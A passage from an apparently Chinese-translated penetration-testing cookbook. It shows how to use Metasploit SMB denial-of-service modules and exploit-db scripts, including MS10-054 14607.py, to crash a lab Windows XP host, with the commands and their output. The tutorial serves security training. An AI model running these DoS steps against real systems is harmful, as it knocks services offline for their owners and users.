+   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                    normal  Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+
+   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                       normal  Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference   
+   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                   normal  Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop   
+   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                     normal  Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS   
+   auxiliary/dos/windows/smb/ms11_019_electbowser                               manual  Microsoft Windows Browser Pool DoS   
+   auxiliary/dos/windows/smb/rras_vls_null_deref               2006-06-14       normal  Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference   
+   auxiliary/dos/windows/smb/vista_negotiate_stop                               normal  Microsoft Vista SP0 SMB Negotiate Protocol DoS
+</code></pre><p>&#x5728;&#x67E5;&#x8BE2;<code>/ dos / windows / smb</code>&#x7684;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x540E;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x552F;&#x4E00;&#x7ED3;&#x679C;&#x662F;&#x6B64;&#x76EE;&#x5F55;&#x4E2D;&#x7684; DoS &#x6A21;&#x5757;&#x3002; &#x76EE;&#x5F55;&#x7EC4;&#x7EC7;&#x826F;&#x597D;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x6709;&#x6548;&#x5730;&#x641C;&#x7D22;&#x4E0E;&#x7279;&#x5B9A;&#x5E73;&#x53F0;&#x6216;&#x670D;&#x52A1;&#x76F8;&#x5173;&#x7684;&#x6F0F;&#x6D1E;&#x3002; &#x4E00;&#x65E6;&#x6211;&#x4EEC;&#x51B3;&#x5B9A;&#x4F7F;&#x7528;&#x54EA;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>use</code>&#x547D;&#x4EE4;&#x548C;&#x6A21;&#x5757;&#x7684;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x6765;&#x9009;&#x62E9;&#x5B83;&#xFF1A;</p>
+<pre><code>msf &gt; use auxiliary/dos/windows/smb/ms06_063_trans 
+msf  auxiliary(ms06_063_trans) &gt; show options
+
+Module options (auxiliary/dos/windows/smb/ms06_063_trans):
+
+   Name   Current Setting  Required  Description   ----   
+   ---------------  --------  ----------   
+   RHOST                   yes       The target address   
+   RPORT  445              yes       Set the SMB service port
+</code></pre><p>&#x4E00;&#x65E6;&#x9009;&#x62E9;&#x4E86;&#x6A21;&#x5757;&#xFF0C;<code>show options</code>&#x547D;&#x4EE4;&#x53EF;&#x7528;&#x4E8E;&#x786E;&#x5B9A;&#x548C;/&#x4FEE;&#x6539;&#x626B;&#x63CF;&#x914D;&#x7F6E;&#x3002; &#x6B64;&#x547D;&#x4EE4;&#x4F1A;&#x663E;&#x793A;&#x56DB;&#x4E2A;&#x5217;&#x6807;&#x9898;&#xFF0C;&#x5305;&#x62EC;<code>Name</code>, <code>Current Setting</code>, <code>Required</code>, &#x548C; <code>Description</code>&#x3002; <code>Name</code>&#x5217;&#x8868;&#x793A;&#x6BCF;&#x4E2A;&#x53EF;&#x914D;&#x7F6E;&#x53D8;&#x91CF;&#x7684;&#x540D;&#x79F0;&#x3002; <code>Current Setting</code>&#x5217;&#x5217;&#x51FA;&#x4EFB;&#x4F55;&#x7ED9;&#x5B9A;&#x53D8;&#x91CF;&#x7684;&#x73B0;&#x6709;&#x914D;&#x7F6E;&#x3002;  <code>Required</code>&#x5217;&#x8868;&#x660E;&#x4EFB;&#x4F55;&#x7ED9;&#x5B9A;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x9700;&#x8981;&#x503C;&#x3002; <code>Description</code>&#x5217;&#x63CF;&#x8FF0;&#x6BCF;&#x4E2A;&#x53D8;&#x91CF;&#x7684;&#x51FD;&#x6570;&#x3002; &#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>set</code>&#x547D;&#x4EE4;&#x5E76;&#x901A;&#x8FC7;&#x63D0;&#x4F9B;&#x65B0;&#x503C;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#xFF0C;&#x6765;&#x66F4;&#x6539;&#x4EFB;&#x4F55;&#x7ED9;&#x5B9A;&#x53D8;&#x91CF;&#x7684;&#x503C;&#xFF1A;</p>
+<pre><code>msf  auxiliary(ms06_063_trans) &gt; set RHOST 172.16.36.134 
+ =&gt; 172.16.36.134 
+ msf  auxiliary(ms06_063_trans) &gt; show options
+
+Module options (auxiliary/dos/windows/smb/ms06_063_trans):
+
+   Name   Current Setting  Required  Description   
+   ----   ---------------  --------  ----------   
+   RHOST  172.16.36.134    yes       The target address   
+   RPORT  445              yes       Set the SMB service port
+</code></pre><p>&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;<code>RHOST</code>&#x503C;&#x66F4;&#x6539;&#x4E3A;&#x6211;&#x4EEC;&#x6253;&#x7B97;&#x626B;&#x63CF;&#x7684;&#x8FDC;&#x7A0B;&#x7CFB;&#x7EDF;&#x7684; IP &#x5730;&#x5740;&#x3002; &#x66F4;&#x65B0;&#x5FC5;&#x8981;&#x7684;&#x53D8;&#x91CF;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>show options</code>&#x547D;&#x4EE4;&#x518D;&#x6B21;&#x9A8C;&#x8BC1;&#x914D;&#x7F6E;&#x3002; &#x4E00;&#x65E6;&#x9A8C;&#x8BC1;&#x4E86;&#x6240;&#x9700;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>run</code>&#x547D;&#x4EE4;&#x542F;&#x52A8;&#x6A21;&#x5757;&#xFF1A;</p>
+<pre><code>msf  auxiliary(ms06_063_trans) &gt; run
+
+[*] Connecting to the target system... 
+[*] Sending bad SMB transaction request 1... 
+[*] Sending bad SMB transaction request 2... 
+[*] Sending bad SMB transaction request 3... 
+[*] Sending bad SMB transaction request 4... 
+[*] Sending bad SMB transaction request 5... 
+[*] Auxiliary module execution completed
+</code></pre><p>&#x5728;&#x6267;&#x884C; Metasploit DoS &#x8F85;&#x52A9;&#x6A21;&#x5757;&#x4E4B;&#x540E;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x6D88;&#x606F;&#x8868;&#x660E;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;&#x4E00;&#x7CFB;&#x5217;&#x6076;&#x610F; SMB &#x4E8B;&#x52A1;&#xFF0C;&#x5E76;&#x4E14;&#x8FD4;&#x56DE;&#x8868;&#x793A;&#x6A21;&#x5757;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x7684;&#x6700;&#x7EC8;&#x6D88;&#x606F;&#x3002; &#x8BE5;&#x6F0F;&#x6D1E;&#x7684;&#x6210;&#x529F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x67E5;&#x770B; Windows XP &#x7CFB;&#x7EDF;&#x6765;&#x9A8C;&#x8BC1;&#xFF0C;&#x5B83;&#x5DF2;&#x7ECF;&#x5D29;&#x6E83;&#xFF0C;&#x73B0;&#x5728;&#x663E;&#x793A; BSOD&#xFF1A;</p>
+<p><img src="img/6-9-1.jpg" alt=""></p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x672C;&#x7EC3;&#x4E60;&#x4E2D;&#x6F14;&#x793A;&#x7684; Metasploit DoS &#x8F85;&#x52A9;&#x6A21;&#x5757;&#x662F;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x653B;&#x51FB;&#x7684;&#x793A;&#x4F8B;&#x3002; &#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x80FD;&#x591F;&#x5BFC;&#x81F4;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4EEC;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4EFB;&#x610F;&#x6570;&#x636E;&#x88AB;&#x52A0;&#x8F7D;&#x5230;&#x975E;&#x9884;&#x671F;&#x7684;&#x5185;&#x5B58;&#x6BB5;&#x3002; &#x8FD9;&#x53EF;&#x80FD;&#x4E2D;&#x65AD;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF0C;&#x5E76;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x6216;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x3002;</p>
+<h2 id="611-&#x4F7F;&#x7528;-exploit-db-&#x6267;&#x884C;dos-&#x653B;&#x51FB;">6.11 &#x4F7F;&#x7528; exploit-db &#x6267;&#x884C;DoS &#x653B;&#x51FB;</h2>
+<p>exploit-db &#x662F;&#x9488;&#x5BF9;&#x6240;&#x6709;&#x7C7B;&#x578B;&#x7684;&#x5E73;&#x53F0;&#x548C;&#x670D;&#x52A1;&#x7684;&#xFF0C;&#x516C;&#x5F00;&#x53D1;&#x5E03;&#x7684;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x96C6;&#x5408;&#x3002; exploit-db &#x62E5;&#x6709;&#x8BB8;&#x591A;&#x53EF;&#x7528;&#x4E8E;&#x6267;&#x884C;DoS&#x653B;&#x51FB;&#x7684;&#x6F0F;&#x6D1E;&#x3002; &#x8FD9;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x79D8;&#x7C4D;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x5728; exploit-db &#x4E2D;&#x627E;&#x5230;DoS&#x6F0F;&#x6D1E;&#xFF0C;&#x786E;&#x5B9A;&#x6F0F;&#x6D1E;&#x7684;&#x7528;&#x6CD5;&#xFF0C;&#x8FDB;&#x884C;&#x5FC5;&#x8981;&#x7684;&#x4FEE;&#x6539;&#x5E76;&#x6267;&#x884C;&#x5B83;&#x4EEC;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x4F7F;&#x7528; exploit-db &#x6267;&#x884C; DoS &#x653B;&#x51FB;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x5B83;&#x6613;&#x53D7; Metasploit DoS &#x8F85;&#x52A9;&#x6A21;&#x5757;&#x4E4B;&#x4E00;&#x7684;&#x653B;&#x51FB;&#x3002; &#x6240;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4F7F;&#x7528; Windows XP &#x7684;&#x5B9E;&#x4F8B;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x5728;&#x4F7F;&#x7528; exploit-db &#x6267;&#x884C; DoS &#x6D4B;&#x8BD5;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x786E;&#x5B9A;&#x54EA;&#x4E9B; DoS &#x6F0F;&#x6D1E;&#x53EF;&#x7528;&#x3002; &#x53EF;&#x4EE5;&#x5728;<code>http://www.exploit-db.com</code>&#x5728;&#x7EBF;&#x627E;&#x5230;&#x5168;&#x90E8;&#x7684;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6570;&#x636E;&#x5E93;&#x3002; &#x6216;&#x8005;&#xFF0C;&#x5176;&#x526F;&#x672C;&#x4E5F;&#x672C;&#x5730;&#x5B58;&#x50A8;&#x5728; Kali Linux &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x3002; &#x5728;<code>exploitdb</code>&#x76EE;&#x5F55;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;<code>files.csv</code>&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x6240;&#x6709;&#x5185;&#x5BB9;&#x7684;&#x76EE;&#x5F55;&#x3002; &#x6B64;&#x6587;&#x4EF6;&#x53EF;&#x7528;&#x4E8E;&#x5BF9;&#x5173;&#x952E;&#x5B57;&#x8FDB;&#x884C;<code>grep</code>&#xFF0C;&#x6765;&#x5E2E;&#x52A9;&#x5B9A;&#x4F4D;&#x53EF;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# grep SMB /usr/share/exploitdb/files.csv 
+20,platforms/windows/remote/20.txt,&quot;MS Windows SMB Authentication Remote Exploit&quot;,2003-04-25,&quot;Haamed Gheibi&quot;,windows,remote,139 
+1065,platforms/windows/dos/1065.c,&quot;MS Windows (SMB) Transaction Response Handling Exploit (MS05-011)&quot;,2005-06-23,cybertronic,windows,dos,0 
+4478,platforms/linux/remote/4478.c,&quot;smbftpd 0.96 SMBDirListfunction Remote Format String Exploit&quot;,2007-10-01,&quot;Jerry Illikainen&quot;,linux,remote,21 
+6463,platforms/windows/dos/6463.rb,&quot;MS Windows WRITE_ANDX SMB command handling Kernel DoS (meta)&quot;,2008-09-15,&quot;Javier Vicente Vallejo&quot;,windows,dos,0
+9594,platforms/windows/dos/9594.txt,&quot;Windows Vista/7 SMB2.0 Negotiate Protocol Request Remote BSOD Vuln&quot;,2009-09-09,&quot;Laurent Gaffie&quot;,windows,dos,0
+</code></pre><p>&#x5728;&#x6240;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4F7F;&#x7528;<code>grep</code>&#x51FD;&#x6570;&#x5728;<code>files.csv</code>&#x6587;&#x4EF6;&#x4E2D;&#x641C;&#x7D22;&#x5305;&#x542B; SMB &#x7684;&#x4EFB;&#x4F55; exploit-db &#x5185;&#x5BB9;&#x3002; &#x8FD8;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5C06;&#x8F93;&#x51FA;&#x901A;&#x8FC7;&#x7BA1;&#x9053;&#x8FDE;&#x63A5;&#x5230;&#x53E6;&#x4E00;&#x4E2A;<code>grep</code>&#x51FD;&#x6570;&#xFF0C;&#x5E76;&#x641C;&#x7D22;&#x9644;&#x52A0;&#x9879;&#x6765;&#x8FDB;&#x4E00;&#x6B65;&#x7F29;&#x5C0F;&#x641C;&#x7D22;&#x8303;&#x56F4;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# grep SMB /usr/share/exploitdb/files.csv | grep dos 
+1065,platforms/windows/dos/1065.c,&quot;MS Windows (SMB) Transaction Response Handling Exploit (MS05-011)&quot;,2005-06-23,cybertronic,windows,dos,0 
+6463,platforms/windows/dos/6463.rb,&quot;MS Windows WRITE_ANDX SMB command handling Kernel DoS (meta)&quot;,2008-09-15,&quot;Javier Vicente Vallejo&quot;,windows,dos,0 
+9594,platforms/windows/dos/9594.txt,&quot;Windows Vista/7 SMB2.0 Negotiate Protocol Request Remote BSOD Vuln&quot;,2009-09-09,&quot;Laurent Gaffie&quot;,windows,dos,0 
+12258,platforms/windows/dos/12258.py,&quot;Proof of Concept for MS10-006 SMB Client-Side Bug&quot;,2010-04-16,&quot;Laurent Gaffie&quot;,windows,dos,0 
+12273,platforms/windows/dos/12273.py,&quot;Windows 7/2008R2 SMB Client Trans2 Stack Overflow 10-020 PoC&quot;,2010-04-17,&quot;Laurent Gaffie&quot;,windows,dos,0
+</code></pre><p>&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4F9D;&#x6B21;&#x4F7F;&#x7528;&#x4E24;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;<code>grep</code>&#x51FD;&#x6570;&#xFF0C;&#x6765;&#x641C;&#x7D22;&#x4E0E; SMB &#x670D;&#x52A1;&#x76F8;&#x5173;&#x7684;&#x4EFB;&#x4F55; DoS &#x6F0F;&#x6D1E;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# grep SMB /usr/share/exploitdb/files.csv | grep dos | grep py | grep -v &quot;Windows 7&quot; 
+12258,platforms/windows/dos/12258.py,&quot;Proof of Concept for MS10-006 SMB Client-Side Bug&quot;,2010-04-16,&quot;Laurent Gaffie&quot;,windows,dos,0 
+12524,platforms/windows/dos/12524.py,&quot;Windows SMB2 Negotiate Protocol (0x72) Response DOS&quot;,2010-05-07,&quot;Jelmer de Hen&quot;,windows,dos,0 
+14607,platforms/windows/dos/14607.py,&quot;Microsoft SMB Server Trans2 Zero Size Pool Alloc (MS10-054)&quot;,2010-08-10,&quot;Laurent Gaffie&quot;,windows,dos,0
+</code></pre><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x7F29;&#x5C0F;&#x641C;&#x7D22;&#x7ED3;&#x679C;&#xFF0C;&#x4F7F;&#x5176;&#x5C3D;&#x53EF;&#x80FD;&#x5177;&#x4F53;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x67E5;&#x627E;&#x4E86; SMB &#x670D;&#x52A1;&#x7684;&#x4EFB;&#x4F55; Python DoS &#x811A;&#x672C;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x5BFB;&#x627E;&#x7684;&#x4E0D;&#x662F; Windows 7 &#x5E73;&#x53F0;&#x7684;&#x3002; <code>gre</code>p&#x4E2D;&#x7684;<code>-v</code>&#x9009;&#x9879;&#x53EF;&#x7528;&#x4E8E;&#x4ECE;&#x7ED3;&#x679C;&#x4E2D;&#x6392;&#x9664;&#x5185;&#x5BB9;&#x3002; &#x901A;&#x5E38;&#x6700;&#x597D;&#x5C06;&#x6240;&#x9700;&#x7684;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x590D;&#x5236;&#x5230;&#x53E6;&#x4E00;&#x4E2A;&#x4F4D;&#x7F6E;&#xFF0C;&#x4EE5;&#x4FBF;&#x4E0D;&#x4F1A;&#x4FEE;&#x6539; exploit &#x6570;&#x636E;&#x5E93;&#x76EE;&#x5F55;&#x7684;&#x5185;&#x5BB9;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# mkdir smb_exploit 
+root@KaliLinux:~# cd smb_exploit/ 
+root@KaliLinux:~/smb_exploit# cp /usr/share/exploitdb/platforms/windows/ dos/14607.py /root/smb_exploit/ 
+root@KaliLinux:~/smb_exploit# ls 14607.py
+</code></pre><p>&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E3A;&#x811A;&#x672C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x76EE;&#x5F55;&#x3002; &#x7136;&#x540E;&#x4ECE;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x590D;&#x5236;&#x811A;&#x672C;&#xFF0C;&#x8BE5;&#x8DEF;&#x5F84;&#x53EF;&#x4EE5;&#x7531; exploit-db &#x7684;&#x76EE;&#x5F55;&#x4F4D;&#x7F6E;&#x548C;<code>files.csv</code>&#x6587;&#x4EF6;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x63A8;&#x65AD;&#x3002; &#x4E00;&#x65E6;&#x91CD;&#x65B0;&#x5B9A;&#x4F4D;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>cat</code>&#x547D;&#x4EE4;&#x4ECE;&#x4E0A;&#x5230;&#x4E0B;&#x8BFB;&#x53D6;&#x811A;&#x672C;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x811A;&#x672C;&#x7684;&#x5185;&#x5BB9;&#x4F20;&#x9012;&#x7ED9;<code>more</code>&#x5DE5;&#x5177;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~/smb_exploit# cat 14607.py | more ?
+
+#!/usr/bin/env python 
+import sys,struct,socket 
+from socket import *
+
+if len(sys.argv)&lt;=2:   
+    print &apos;############################################################### ########&apos;   
+    print &apos;#   MS10-054 Proof Of Concept by Laurent Gaffie&apos;   
+    print &apos;#   Usage: python &apos;+sys.argv[0]+&apos; TARGET SHARE-NAME (No backslash)&apos;   
+    print &apos;#   Example: python &apos;+sys.argv[0]+&apos; 192.168.8.101 users&apos;   
+    print &apos;#   http://g-laurent.blogspot.com/&apos;   
+    print &apos;#   http://twitter.com/laurentgaffie&apos;   
+    print &apos;#   Email: laurent.gaffie{at}gmail{dot}com&apos;   
+    print &apos;############################################################### ########\n\n&apos;   
+    sys.exit()
+</code></pre><p>&#x4E0E; NSE &#x811A;&#x672C;&#x548C; Metasploit &#x8F85;&#x52A9;&#x6A21;&#x5757;&#x4E0D;&#x540C;&#xFF0C;&#x6F0F;&#x6D1E;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x811A;&#x672C;&#x6CA1;&#x6709;&#x6807;&#x51C6;&#x5316;&#x683C;&#x5F0F;&#x3002; &#x56E0;&#x6B64;&#xFF0C;&#x4F7F;&#x7528;&#x6F0F;&#x6D1E;&#x6709;&#x65F6;&#x4F1A;&#x5F88;&#x68D8;&#x624B;&#x3002; &#x5C3D;&#x7BA1;&#x5982;&#x6B64;&#xFF0C;&#x67E5;&#x770B;&#x811A;&#x672C;&#x5185;&#x5BB9;&#x4E2D;&#x7684;&#x4E3A;&#x6CE8;&#x91CA;&#x6216;&#x4F7F;&#x7528;&#x8BF4;&#x660E;&#x901A;&#x5E38;&#x662F;&#x6709;&#x5E2E;&#x52A9;&#x7684;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#x5217;&#x5728;&#x811A;&#x672C;&#x7684;&#x5185;&#x5BB9;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x672A;&#x63D0;&#x4F9B;&#x9002;&#x5F53;&#x6570;&#x91CF;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x4E5F;&#x4F1A;&#x5C06;&#x5176;&#x6253;&#x5370;&#x7ED9;&#x7528;&#x6237;&#x3002; &#x8BC4;&#x4F30;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x811A;&#x672C;&#x3002;</p>
+<pre><code>root@KaliLinux:~/smb_exploit# ./14607.py 
+./14607.py: line 1: ?#!/usr/bin/env: No such file or directory 
+import.im6: unable to open X server `&apos; @ error/import.c/ 
+ImportImageCommand/368. 
+from: can&apos;t read /var/mail/socket 
+./14607.py: line 4: $&apos;\r&apos;: command not found 
+./14607.py: line 5: syntax error near unexpected token `sys.argv&apos; 
+&apos;/14607.py: line 5: `if len(sys.argv)&lt;=2:
+</code></pre><p>&#x4F46;&#x662F;&#xFF0C;&#x5728;&#x5C1D;&#x8BD5;&#x6267;&#x884C;&#x811A;&#x672C;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x51FA;&#x73B0;&#x4E86;&#x95EE;&#x9898;&#x3002; &#x7531;&#x4E8E;&#x7F3A;&#x4E4F;&#x6807;&#x51C6;&#x5316;&#xFF0C;&#x5E76;&#x4E14;&#x7531;&#x4E8E;&#x4E00;&#x4E9B;&#x811A;&#x672C;&#x53EA;&#x662F;&#x6982;&#x5FF5;&#x8BC1;&#x660E;&#xFF0C;&#x901A;&#x5E38;&#x9700;&#x8981;&#x5BF9;&#x8FD9;&#x4E9B;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x8C03;&#x6574;&#xFF1A;</p>
+<pre><code class="lang-py">?#!/usr/bin/env python 
+import sys,struct,socket 
+from socket import *
+</code></pre>
+<p>&#x5728;&#x811A;&#x672C;&#x9519;&#x8BEF;&#x51FA;&#x73B0;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8FD4;&#x56DE;&#x5230;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF0C;&#x5E76;&#x5C1D;&#x8BD5;&#x786E;&#x5B9A;&#x9519;&#x8BEF;&#x7684;&#x6765;&#x6E90;&#x3002; &#x7B2C;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;&#x8868;&#x660E;&#xFF0C;&#x5728;&#x811A;&#x672C;&#x5F00;&#x5934;&#x5217;&#x51FA;&#x7684; Python &#x89E3;&#x91CA;&#x5668;&#x7684;&#x4F4D;&#x7F6E;&#x5B58;&#x5728;&#x95EE;&#x9898;&#x3002; &#x8FD9;&#x5FC5;&#x987B;&#x6539;&#x53D8;&#x4E3A;&#x6307;&#x5411; Kali Linux &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x89E3;&#x91CA;&#x5668;&#xFF1A;</p>
+<pre><code class="lang-py"><span class="hljs-comment">#!/usr/bin/python </span>
+<span class="hljs-keyword">import</span> sys,struct,socket 
+<span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *
+</code></pre>
+<p>&#x5728;&#x6BCF;&#x4E2A;&#x95EE;&#x9898;&#x89E3;&#x51B3;&#x540E;&#xFF0C;&#x5C1D;&#x8BD5;&#x518D;&#x6B21;&#x8FD0;&#x884C;&#x811A;&#x672C;&#x901A;&#x5E38;&#x662F;&#x4E2A;&#x597D;&#x4E3B;&#x610F;&#xFF0C;&#x6709;&#x65F6;&#xFF0C;&#x4FEE;&#x590D;&#x5355;&#x4E2A;&#x95EE;&#x9898;&#x4F1A;&#x6D88;&#x9664;&#x591A;&#x4E2A;&#x6267;&#x884C;&#x9519;&#x8BEF;&#x3002; &#x8FD9;&#x91CC;&#xFF0C;&#x5728;&#x66F4;&#x6539; Python &#x89E3;&#x91CA;&#x5668;&#x7684;&#x4F4D;&#x7F6E;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6210;&#x529F;&#x8FD0;&#x884C;&#x811A;&#x672C;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~/smb_exploit# ./14607.py 172.16.36.134 users 
+[+]Negotiate Protocol Request sent 
+[+]Malformed Trans2 packet sent 
+[+]The target should be down now
+</code></pre><p>&#x5F53;&#x811A;&#x672C;&#x8FD0;&#x884C;&#x65F6;&#xFF0C;&#x4F1A;&#x8FD4;&#x56DE;&#x51E0;&#x4E2A;&#x6D88;&#x606F;&#x6765;&#x6807;&#x8BC6;&#x811A;&#x672C;&#x6267;&#x884C;&#x7684;&#x8FDB;&#x5EA6;&#x3002; &#x6700;&#x540E;&#x4E00;&#x6761;&#x6D88;&#x606F;&#x8868;&#x660E;&#x6076;&#x610F;&#x7684;&#x8F7D;&#x8377;&#x5DF2;&#x4F20;&#x9001;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5E94;&#x8BE5;&#x5DF2;&#x7ECF;&#x5D29;&#x6E83;&#x3002; &#x8BE5;&#x811A;&#x672C;&#x7684;&#x6210;&#x529F;&#x6267;&#x884C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD4;&#x56DE; Windows &#x670D;&#x52A1;&#x5668;&#x6765;&#x9A8C;&#x8BC1;&#xFF0C;&#x5B83;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x5D29;&#x6E83;&#xFF0C;&#x5E76;&#x663E;&#x793A;&#x4E86; BSOD&#xFF1A;</p>
+<p><img src="img/6-9-1.jpg" alt=""></p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x672C;&#x7EC3;&#x4E60;&#x4E2D;&#x6F14;&#x793A;&#x7684; exploit-db DoS &#x811A;&#x672C;&#x662F;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x653B;&#x51FB;&#x7684;&#x793A;&#x4F8B;&#x3002; &#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x80FD;&#x591F;&#x5BFC;&#x81F4;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4EEC;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4EFB;&#x610F;&#x6570;&#x636E;&#x88AB;&#x52A0;&#x8F7D;&#x5230;&#x975E;&#x9884;&#x671F;&#x7684;&#x5185;&#x5B58;&#x6BB5;&#x3002; 